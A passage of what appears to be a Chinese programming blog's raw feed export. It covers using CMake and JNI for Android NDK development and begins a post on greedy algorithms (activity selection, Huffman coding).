cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.4</span>.<span class="number">1</span>)</span><br><span class="line"><span class="keyword">project</span> (hello)</span><br><span class="line"><span class="keyword">add_executable</span>(hello <span class="keyword">test</span>.cpp)</span><br></pre></td></tr></table></figure><p>　　第一行 cmake_minimum_required() 命令设置了这个项目要求的 CMake 的最小版本。这里我们设置为 3.4.1，你也可以根据自己的实际情况更改这个参数。<br>　　第二行声明了项目的名称，这里我们简单地称之为 hello。<br>　　最下面一行是添加可执行文件，第一个参数是可执行文件的名字，第二个参数是源文件，即把 test.cpp 作为源文件，编译成一个名为hello的可执行文件。当然，如果还有用到其他的源文件，我们还可以写成”add_executable(hello test1.cpp test2.cpp, …)”<br>　　文件写好后，保存。根目录下应该有两个文件: CMakeLists.txt 和 test.cpp。这个时候在根目录下调用以下命令:</p><blockquote><p>cmake .<br>make</p></blockquote><p>　　第一行代码用于 CMake，在 linux 下，它生成了许多项目文件，以及一个 Makefile 文件。第二行调用 make，即使用 Makefile 文件中的信息将项目”打包”为可执行文件。<br>　　不过，我们会发现，生成的 Makefile 文件和可执行文件等都放在了当前的目录下，显得十分不美观。我们可以让它显得更有结构一些。在 CMakeLists.txt 文件的 add_executable 命令前中添加语句:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span>(EXECUTABLE_OUTPUT_PATH <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/bin)</span><br><span class="line"><span class="keyword">set</span>(LIBRARY_OUTPUT_PATH <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/lib)</span><br><span class="line"><span class="keyword">add_library</span>(ano SHARED <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/<span class="keyword">test</span>.cpp)</span><br></pre></td></tr></table></figure><p>　　其中，set 命令用于设置变量的值，第一个参数表示需要被设置的变量，第二个参数表示变量的值。CMAKE_SOURCE_DIR 是 CMake 内置的变量，表示当前源文件的目录，我们将 EXECUTABLE_OUTPUT_PATH 和 LIBRARY_OUTPUT_PATH 分别设置在 bin 和 lib 文件夹下，那么构建后所有的可执行文件都会放在 bin 文件夹中，所有的库文件都会放在 lib 文件夹中。<br>　　add_library 用于打包成库文件，第一个参数表示生成的库的名字，第二个参数可选，”SHARED” 表示生成共享库(.so)文件，没有加的话默认生成 .a 文件。最后一个参数是源文件。生成的文件的名字为 lib+库名字+后缀名，如这里生成的文件名应该为 libano.so。<br>　　添加完这几行后，保存。在命令行中键入:</p><blockquote><p>cmake -B build<br>// 这下面应该是两个-，但好像显示有点问题<br>cmake –build bulid</p></blockquote><p>　　第一行 -B 表示构建过程生成的文件的存放位置，放在 /build 文件夹下。第二行则是相当与在 /build 文件夹下调用 make 命令。如果顺利的话，最后我们就能得到这样的目录结构:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">|-- CMakeLists.txt</span><br><span class="line">|-- bin</span><br><span class="line">|   `-- hello</span><br><span class="line">|-- build</span><br><span class="line">|   |-- CMakeCache.txt</span><br><span class="line">|   |-- CMakeFiles</span><br><span class="line">|   |   |-- <span class="number">3.15</span>.<span class="number">2</span></span><br><span class="line">|   |   |-- CMakeDirectoryInformation.cmake</span><br><span class="line">|   |   |-- CMakeOutput.log</span><br><span class="line">|   |   |-- CMakeTmp</span><br><span class="line">|   |   |-- Makefile.cmake</span><br><span class="line">|   |   |-- Makefile2</span><br><span class="line">|   |   |-- TargetDirectories.txt</span><br><span class="line">|   |   |-- ano.dir</span><br><span class="line">|   |   |-- cmake.check_cache</span><br><span class="line">|   |   |-- hello.dir</span><br><span class="line">|   |   `-- progress.marks</span><br><span class="line">|   |-- Makefile</span><br><span class="line">|   `-- cmake_install.cmake</span><br><span class="line">|-- lib</span><br><span class="line">|   `-- libano.so</span><br><span class="line">`-- <span class="keyword">test</span>.cpp</span><br></pre></td></tr></table></figure><p>　　怎么样?看起来是不是有一点”正式项目”的感觉呢?那么我们来试着用目前学到的知识来实现在 Android Studio 中调用 C 的代码吧。先创建一个空的项目(创建时选择 Empty Activity 即可)，并命名为 Test(你也可以用其他的你想要起的名字)。进入之后，我们应该就得到了一个 Android 版的 HelloWorld 程序。<br>　　接下来，在模块的 src/main 文件夹下创建一个新的文件夹，命名为 app，用于存放我们的CMakeLists 文件以及 C/C++ 文件。然后，我们再创建一个 CMakeLists.txt 文件，在文件中写上:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.4</span>.<span class="number">1</span>)</span><br><span class="line"><span class="keyword">add_library</span>(my-sdk SHARED main.cpp)</span><br><span class="line"><span class="keyword">target_link_libraries</span>(my-sdk android log)</span><br></pre></td></tr></table></figure><p>　　和之前类似。第一行声明了最低的版本。第二行将 main.cpp 添加到库名字为 my-sdk 的 .so 文件，我们得到了 libmy-sdk.so。第三行将 android 库和 log 库与我们的 my-sdk 链接在一起。这样，我们的 CMakeLists 文件就写好了。接下来，我们再来写一下 main.cpp 文件。这里我写的代码如下:<br>　　<strong>Warning</strong>: 这里的代码不能直接复制，如果你足够细心的话，你会发现，我们的函数名字是有规定的。它的格式是 Java 开头，接下来是包名，文件夹之间以’_’隔开，再接下来是类名，默认是 MainActivity，最后才是方法的名字，这里我方法命名为 getStringFromJNI。参数不能省略。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"jni.h"</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> JNIEXPORT jstring JNICALL</span><br><span class="line">Java_com_example_littlecsd_test_MainActivity_getStringFromJNI(</span><br><span class="line">    JNIEnv* env, jobject thiz) &#123;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"Receive String From JNI!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　具体为什么要这样写，我们可以先暂时不管，等会我们再回来看。<br>　　紧接着，我们可以在 Java 层写调用的代码了。在 MainActivity 中，我用了一个 id 为 show 的 TextView 来展示。这里我用的是 Kotlin，Java 的写法也是一样的。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line">    setContentView(R.layout.activity_main)</span><br><span class="line">    show.text = getStringFromJNI()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 声明Native层的方法，Java的话是使用native关键字</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">external</span> <span class="function"><span class="keyword">fun</span> <span class="title">getStringFromJNI</span><span class="params">()</span></span>: String</span><br><span class="line"><span class="keyword">companion</span> <span class="keyword">object</span> &#123;</span><br><span class="line">    <span class="keyword">init</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化，调用系统函数，载入my-sdk库</span></span><br><span class="line">        System.loadLibrary(<span class="string">"my-sdk"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　那么，现在我们Java和C层的代码都写好了，CMake 文件也写好了，我们可以试着点击 Run 运行试一下结果是什么样的了。不出意外的话，我们的 Activity 会闪退。通过排查，我们会发现，有一个重要的步骤被我们略去了。我们虽然这些文件都写好了，可是谁去调用 CMake 命令生成动态库文件呢?<br>　　这个时候就要用到我们神奇的 build.gradle 文件了，gradle 本身对 CMake 是有支持的(官方亲儿子~~)。我们只需要在 module 下的 build.gradle 文件(注意有两个 build.gradle，不要搞错)中添加命令，告诉 gradle，需要去调用 cmake 即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion <span class="number">29</span></span><br><span class="line">    buildToolsVersion <span class="string">"29.0.2"</span></span><br><span class="line">    defaultConfig &#123; ... &#125;</span><br><span class="line">    buildTypes &#123; ... &#125;</span><br><span class="line">    <span class="comment">// 添加下面的命令</span></span><br><span class="line">    externalNativeBuild &#123;</span><br><span class="line">        cmake &#123;</span><br><span class="line">            version '3.10.2'</span><br><span class="line">            path 'src/main/app/CMakeLists.txt'</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　现在，你可以再次尝试一下，不出意外的话，我们应该可以看到界面中间显示这一个字符串:</p><blockquote><p>Receive String From JNI!</p></blockquote><p>　　Congratulations! 我们成功地调用了C层的代码了。是不是其实挺简单的呢?如果你还是出现错误的话，最好仔细检查一下之前的代码是否有出现什么问题，有可能有一些单词打错之类的。</p><h2 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h2><p>　　前面我们能够简单地实现 Java 层调用 C 的函数了。那么，接下来我们需要考虑一下，C 层应该如何调用 Java 的函数呢? C 和 Java 究竟是怎样实现数据的交流的?答案都在 JNI 当中。JNI 定义了 java 字节码与本地代码交互的方式，它像一个中间商，并且还可以读取动态库文件，尽管有时比较麻烦，却还是比较高效的。</p><h3 id="General-Tips"><a href="#General-Tips" class="headerlink" title="General Tips"></a>General Tips</h3><p>　　在使用 JNI 的时候，我们需要尽量最小化JNI层所占用的空间。有以下几点需要考虑的:</p><ol><li>尽量减少跨 JNI 层的数据转换，这种跨 JNI 层的操作对时间的消耗是很明显的。</li><li>尽量避免在代码中进行跨 JNI 的异步交流。在需要交互的时候，可以使用两个线程，UI 线程负责 Java层，另一个线程负责进行 C++ 层的阻塞调用，当调用完成后通知 UI 线程对 UI 进行更新即可。</li><li>最小化需要和 JNI 接触的线程数量。</li><li>将接口代码保存在少量的易于识别的 C++ 和 Java 源代码位置，有利于后续的维护/重构</li></ol><h3 id="JavaVM-and-JNIEnv"><a href="#JavaVM-and-JNIEnv" class="headerlink" title="JavaVM and JNIEnv"></a>JavaVM and JNIEnv</h3><p>　　JNI 定义了两种关键的数据结构，”JavaVM” 和 “JNIEnv”。两者都是十分重要的指针，指向函数表。JavaVM 提供了一个”调用接口”函数，使得我们可以创建或销毁一个 JavaVM。理论上一个进程可以有多个JavaVM，但安卓只允许有一个。在 jni.h 中，定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">JavaVM</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNIInvokeInterface</span>* <span class="title">functions</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__cplusplus)</span></span><br><span class="line">    <span class="function">jint <span class="title">DestroyJavaVM</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;DestroyJavaVM(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThread</span><span class="params">(JNIEnv** p_env, <span class="keyword">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;AttachCurrentThread(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">DetachCurrentThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;DetachCurrentThread(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">GetEnv</span><span class="params">(<span class="keyword">void</span>** env, jint version)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;GetEnv(<span class="keyword">this</span>, env, version); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThreadAsDaemon</span><span class="params">(JNIEnv** p_env, <span class="keyword">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;AttachCurrentThreadAsDaemon(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/*__cplusplus*/</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>　　JNIEnv 则提供了大多数的 JNI 函数，所有的 native 函数都接收一个 JNIEnv 变量作为第一个参数。JNIEnv 用于线程的本地存储，因此，不同线程之间不允许共享 JNIEnv。如果一块代码没有其它方式可以获得 JNIEnv，那么可以使用 JavaVM 变量，使用 GetEnv 函数去找当前线程的 JNIEnv (如果有的话)。我们可以查看<a href="https://little-csd.oss-cn-shanghai.aliyuncs.com/jni.h?Expires=1571410650&amp;OSSAccessKeyId=TMP.hdDJqS5ghj9UCMZL26X6wF6fyNzMyxxDdDNMSaB59LoFXQxkgS1iRGho3yuK7n9xJ62uoX9dPag5wNaJ8zmpta98n5D5VSQrtqh2j76jkcP4EwjN9eqr1Wqs5gHzuN.tmp&amp;Signature=rWEsBfnYtUTvYRni%2Fk%2FDvE9QyhE%3D" target="_blank" rel="noopener">jni.h文件</a>以获得更加详细的信息。<br>　　细心的同学可能会发现，javaVM 翻译过来不就是 java virtual machind —— jvm 吗? 是的，我们在 jni 中用到的 javaVM 变量事实上就代表这 java 虚拟机，在加载动态库链接的时候，如果我们定义了 JNI_OnLoad 方法的话，就会将 javaVM 变量传进来，我们可以将其保存起来进行使用。你甚至可以使用 jni.h 库提供的函数，直接在本地的一个 cpp 文件中创建一个 java 虚拟机，并使用该虚拟机去执行 java 代码!</p><h3 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h3><p>　　Android 中的线程都是 Linux 线程，遵循 POSIX 规范，由内核进行调度。他们通常是从托管代码开始(使用T hread.start())，但是他们也可以在其他地方进行创建，并关联到 JavaVM 中。比如我们可以在 Native 层中调用 pthread_create 方法创建线程，并调用 JNI 的 AttachCurrentThread 或者AttachCurrentThreadAsDaemon 函数绑定 JavaVM。在线程 attach 之前，它不包含 JNIEnv，因此不能进行 JNI 调用。<br>　　当一个 native 线程 attach 的时候，会有一个对应的 java.lang.Thread 对象被创建并加入到主线程组当中，使得它对调试器可见。<br>　　另一个值得注意的点是，安卓并不会暂停正在执行 native 代码的线程。当垃圾回收器在处理中或者调试器发起了暂停请求时，该线程会下次进行 JNI 调用的时候被暂停。<br>　　此外，native 线程 attach 后，在退出之前需要调用 JNI 的 DetachCurrentThread 函数。但是直接进行这样的调用过于笨拙，在安卓2.0或者更高的版本后，可以使用 pthread_key_create 函数定义一个析构函数(当线程退出前被调用)。另外，如果读者使用 java 做过一定的开发的话，会发现 Thread 类中的好几个方法(比如 start)最后都会转到一个 native 方法，这说明 java 在新建一个线程时，会使用操作系统提供的线程接口，更进一步说，java 的线程和 native 线程是有一定的对应关系的 (不一定是一一对应)。不过，如果操作系统没有提供多线程呢? (那就自己造呗。</p><h3 id="jclass-jmethodID-and-jfieldID"><a href="#jclass-jmethodID-and-jfieldID" class="headerlink" title="jclass, jmethodID, and jfieldID"></a>jclass, jmethodID, and jfieldID</h3><p>　　在 native 层，如果想访问一个 Java 对象，那就需要做以下的操作</p><ol><li>使用 FindClass 获得类的一个实例的引用</li><li>使用 GetFieldID 获得域的 ID</li><li>使用 ID 以及其他需要的参数获得 Java 对象，比如 GetIntField</li></ol><p>　　类似的，如果想要调用一个方法，也需要先获得一个类的对象的引用然后就是一个方法 ID。第一次调用的话是比较耗时的，但获得了域后进行调用就很快了。如果比较追求效率的话，最好在 native 层中进行缓存。可以在类中放置一个静态代码块，当类被加载的时候，调用 native 函数对一些值进行缓存。<br>　　等等… findClass, GetID ??? 这样的写法不禁让人想到了 java 的一个重要特性 —— reflection. 没错，你的直觉是对的，这种写法和 java 中的反射是及其类似的，包括反射的实现，最终也依赖于一个 native 方法。</p><h3 id="Local-and-global-reference"><a href="#Local-and-global-reference" class="headerlink" title="Local and global reference"></a>Local and global reference</h3><p>　　每一个传递给 native 方法的参数以及每一个 JNI 方法返回的对象都是局部变量。这意味着在当钱县城的当前方法中使用是合法的。但是，一旦本地方法返回，引用就失效了，即使引用的对象本身还继续存活着。(猜测应该和 GC 有关)<br>　　获得非局部变量的唯一方法是使用 NewGlobalRef 或者 NewWeakGlobalRef 方法。如果想要长期使用某个引用，就要把它设置为全局的。全局变量直到使用 DeleteGlobalRef 将其删除前都是合法的。<br>　　所有的 JNI 方法接受局部和全局引用作为参数。并且，对于同一个对象，有可能会有多个值不同的引用。比如当连续调用 NewGlobalRef 方法得到的返回值可能是不同的。因此我们不能简单地使用’==’去判断两个对象是否相同，而是应该调用 IsSameObject 方法。这就造成了一个问题 —— 我们不能假定对象的引用是一个固定不变的值。<br>　　另一个值得一提的点是，如果一个 native 线程已经调用了 AttachCurrentThread 方法，代码中的局部变量不会自动释放(直到线程 detach 之前)。所有创建的局部变量都需要自己进行删除。</p><h3 id="Primitive-arrays"><a href="#Primitive-arrays" class="headerlink" title="Primitive arrays"></a>Primitive arrays</h3><p>　　JNI提供了访问数组对象的函数。并且，我们可以像声明一个C语言的数组一样使用它。Get\&lt;type>ArrayElement 系列的函数可以帮助我们实现对数组的访问。如 GetIntArrayElements(jintArray array, jboolean* isCopy)。第一个参数传入 jintArray 变量，可以使用 FindClass 方法获得。第二个参数传入一个 bool 值，表示返回的是实际的位于 Java 层的数组的指针还是重新分配一块区域，并把数组元素复制进去。另外，通过这个方法获得的数组指针在被释放前一直是合法的，这就意味着我们自行使用 Release 方法将其释放。注意到如果我们获得的是实际的数组的指针，用完后一定要将其释放，否则由于存在引用，这个数组无法被垃圾回收器移动/回收，这将导致内存泄漏。<br>　　Release函数声明如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReleaseIntArrayElements</span><span class="params">(jintArray <span class="built_in">array</span>, jint* elems, jint mode)</span></span></span><br></pre></td></tr></table></figure><p>　　其中，第三个变量表示释放的模式，共有三种输入:</p><ol><li>0: 如果是实际的数组指针，则消除对原数组的固定，使其能被回收。如果是复制的数组，将更改复制回去，并将数组释放。</li><li>JNI_COMMIT: 如果是实际的数组指针，则不做任何处理。如果是复制的数组，则将修改复制回去，不释放数组。</li><li>JNI_ABORT: 如果是实际的数组指针，取消对原数组的固定，但早期的更改不会丢弃。如果是复制的数组，则释放数组，但所有的更改都会丢弃。</li></ol><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>　　在使用 GetMethodID 一类的方法时，我们需要传入函数的签名的字符串。我们知道，函数的签名是由传入的变量类型以及返回值组成的，签名有一定的转换规则，下面我们可以看下几个例子:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>;                   <span class="string">"()V"</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test2</span><span class="params">(String s)</span></span>;            <span class="string">"(Ljava/lang/String;)I"</span></span><br><span class="line">long test3(char[] c, String s)  "([CLjava/lang/String;)J"</span><br></pre></td></tr></table></figure><p>　　对应的表格如下。注意参数直接连在一起，中间不用空格</p><table><thead><tr><th style="text-align:center">Java类型</th><th style="text-align:center">对应的串</th></tr></thead><tbody><tr><td style="text-align:center">boolean</td><td style="text-align:center">Z</td></tr><tr><td style="text-align:center">byte</td><td style="text-align:center">B</td></tr><tr><td style="text-align:center">char</td><td style="text-align:center">C</td></tr><tr><td style="text-align:center">short</td><td style="text-align:center">S</td></tr><tr><td style="text-align:center">int</td><td style="text-align:center">I</td></tr><tr><td style="text-align:center">long</td><td style="text-align:center">J</td></tr><tr><td style="text-align:center">float</td><td style="text-align:center">F</td></tr><tr><td style="text-align:center">double</td><td style="text-align:center">D</td></tr><tr><td style="text-align:center">void</td><td style="text-align:center">V</td></tr><tr><td style="text-align:center">类</td><td style="text-align:center">L + 类名(包括包名) + ;</td></tr><tr><td style="text-align:center">数组</td><td style="text-align:center">[ + 元素类型</td></tr><tr><td style="text-align:center">方法</td><td style="text-align:center">(paras-type)res-type</td></tr></tbody></table><h2 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h2><p>　　在这篇博客中，我们简单地介绍了 JNI 的使用，通过阅读 google 的官方文档，我们基本学会了如何在 C/C++ 和 Java 层之间进行简单的交互。NDK 作为 Android 开发中的一个重要部分，尝试着去了解一下之后还是会发现，里面有很多比较有意思的东西，尤其用到了 C 语言的话，就会涉及到一些 Java 虚拟机，或者是操作系统方向的知识了。不过，如果可以的话，其实并不会特别推荐使用 ndk 进行开发，因为 C/C++ 层的管理以及和 java 层之间的交互是很容易出问题的，除非需要用到一些 java 所无法实现的需求或者 C/C++ 的库难以迁移到 java。另外，其实现在本身 java 已经做了许多的优化，比如 JIT 技术，这使得现在 java 应用程序的执行效率事实上并不会和 C/C++ 程序有过大的差距。如果时间充足的话，建议后续再进行深入的了解。</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NDK </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Greedy algorithm &amp; Dynamic programming</title>
      <link href="/2019/10/09/greedy-algorithm/"/>
      <url>/2019/10/09/greedy-algorithm/</url>
      
        <content type="html"><![CDATA[<h2 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h2><p>　　这是算法导论系列的第二篇笔记，这篇文章的主题是贪心算法和动态规划，主要讲一下两者的思想以及一些简单应用。最后还会将两者做一个简单的对比。当然，贪心和动态规划毫无疑问是算法大家庭中十分重要的两个概念，因此都应该掌握。</p><h2 id="Greedy-algorithm"><a href="#Greedy-algorithm" class="headerlink" title="Greedy algorithm"></a>Greedy algorithm</h2><p>　　贪心思想如果用一句话来概括的话，就是不断地寻找局部的最优解以尝试求得全局的最优解。如果把程序看成是一个状态机的话，贪心算法就是找出当前状态下，收益最大的一个转移路径，并跳转到该状态，直到末状态，结束运行。当然，贪心算法并不能保证能得到一个全局最优的解，它需要带求解问题具有最优子结构的特性。利用好贪心思想，可以简化许多复杂的问题。<br>　　贪心算法的设计步骤如下:</p><ol><li>将最优化问题转化为这样的形式:对其作出一次选择后，只剩下一个问题需要求解</li><li>证明作出贪心选择后，原问题总是存在最优解</li><li>证明作出贪心选择后，子问题满足性质:其最优解和贪心选择组合后可以得到原问题的最优解，即存在最优子结构</li></ol><h3 id="Activity-selected-problem"><a href="#Activity-selected-problem" class="headerlink" title="Activity selected problem"></a>Activity selected problem</h3><p>　　活动选择问题是贪心算法的一个重要应用。假定有一个n个活动的集合\(S=\{a_1,a_2,…a_n\}\)，这些活动使用同一个资源（比如一个教室），而这个资源在某一个时刻只能给一个活动使用。每个活动有一个开始时间\(s_i\)和一个结束时间\(f_i\)，其中\(0\leq s_i&lt;f_i&lt;∞\)<br>　　如果某个任务被选中，即任务发生在区间\([s_i,f_i)\)中。如果两个活动的区间不重叠，我们称两个活动是兼容的。我们的任务是寻找一个最大的兼容活动集合。<br>　　首先，我们需要先证明活动选择问题具有最优子结构。用\(S_{ij}\)表示在\(a_i\)结束后开始，且在\(a_j\)开始前结束的活动的集合。我们希望求解的是该集合的一个最大的相互兼容的活动子集。假定\(A_{ij}\)为这样的一个集合，且该集合包含了活动\(a_k\)。那么这个时候我们得到了两个子问题:\(S_{ik}和S_{kj}\)的最大兼容活动子集。可以用剪切-粘贴法证明。这样，我们可以把问题不断地细分:<br>$$<br>A[i,j]=\begin{cases}<br>0,\quad S_{ij}=\phi \\<br>\max\limits_{a\in S_{ij}}{A[i,k]+A[k,j]+1},\quad S_{ij}\not=\phi<br>\end{cases}<br>$$<br>　　当然，我们还有其他的做法。我们事实上不需要去考虑\(S_{ij}\)区间内所有的活动，直观上，如果我们想要在一个区间内容下更多的活动，那么就要求当前选择的活动能给剩下的活动留下更多的空间。因此，我们可以在\(S_{ij}\)区间内选择<strong>结束时间最早</strong>的活动。这样我们就可以这样去解决活动选择问题:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Activity-Selector(s,f,k,n)</span><br><span class="line">    n = s.length</span><br><span class="line">    A = &#123;a[<span class="number">0</span>]&#125;</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> m = <span class="number">1</span> to n</span><br><span class="line">        <span class="keyword">if</span> s[m] &gt;= f[k]</span><br><span class="line">            A = A U &#123;a[m]&#125;</span><br><span class="line">            k = m</span><br><span class="line">    <span class="keyword">return</span> A</span><br></pre></td></tr></table></figure><p>　　为了方便求解，我们需要添加一个虚拟的活动，\(a_0\)，其结束时间\(f_0=0\)。我们在把集合S中的所有活动按照开始时间从小到大的顺序排序后，调用Activity-Selector方法就可以得到完整的最大兼容子集\(A_{1,n}\)，最终复杂度为O(nlogn)<br>　　如何证明这样的选择是正确的呢？我们可以同样可以利用剪切-粘贴法去证明，比较简单，这里就不详细写了。另外，注意到，选择时间最短的活动不一定能得到最大兼容子集，比如活动集合\(S={a_1=[1,9),a_2=[8,11),a_3=[9,15)}\)，时间最短的活动并不在最大兼容子集当中。那么如果选择开始时间最晚的活动呢？其实也是可以的，不过我们就需要从右往左去遍历了，同时按照结束时间去排序。</p><h3 id="Huffman-coding"><a href="#Huffman-coding" class="headerlink" title="Huffman coding"></a>Huffman coding</h3><p>　　贪心算法的另一个应用就是赫夫曼编码，这种编码可以有效地对数据进行压缩。具体的压缩率和数据相关。如果我们把待压缩数据看作字符序列(8位二进制数)，根据每个字符的出现频率，赫夫曼贪心算法构造出各个字符的最优二进制表示。<br>　　考虑大量字符序列，假设字符a的出现频率很高，那么如果我们能够减小a的二进制表示长度的话，我们就可以对数据进行很好压缩。赫夫曼编码就是这样做的。对于出现频率越高的字符，它的字符编码越短，反之越长。比如对于这样一个文件:<br>$$<br>\begin{array}{|c|c|c|c|c|c|c|}<br>\hline<br> &amp; a &amp; b &amp; c &amp; d &amp; e &amp; f\\<br>\hline<br>频率(千次) &amp; 45 &amp; 13 &amp; 12 &amp; 16 &amp; 9 &amp; 5\\<br>\hline<br>定长编码 &amp; 000 &amp; 001 &amp; 010 &amp; 011 &amp; 100 &amp; 101 \\<br>\hline<br>变长编码 &amp; 0 &amp; 101 &amp; 100 &amp; 111 &amp; 1101 &amp; 1100 \\<br>\hline<br>\end{array}<br>$$</p><p>　　使用定长编码，我们需要30W个二进制位来编码文件。如果使用变长编码的话，我们只需要\((45 \times 1+13 \times 3+12 \times 3+16 \times 3+9 \times 4+5 \times 4) \times 1000=22.4W\)个二进制位，节约了大概 25K 的空间。下图a为定长编码的编码树，b为变长编码。</p><p><img src="/2019/10/09/greedy-algorithm/huffman-coding.png" alt="huffman"></p><p>　　文件的最优编码方案总是对应一棵满二叉树。即每个非叶结点都有两个孩子。给定一棵对应前缀码的树T，我们可以很容易算出编码一个文件 需要的二进制位的个数。对于每个字符c，令c.freq表示字符在文件中出现的频率，\(d_T(c)\)表示c的叶结点在树中的深度(同时也是字符c的码字的长度)。则编码文件需要的二进制位数量为:</p><p>$$B(T)=\Sigma_{c \in C}c.freq*d_T(c)$$</p><p>　　我们称B(T)为T的代价<br>　　赫夫曼编码就是使用贪心思想，构造出一棵最优的前缀树对文件进行编码。具体的做法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 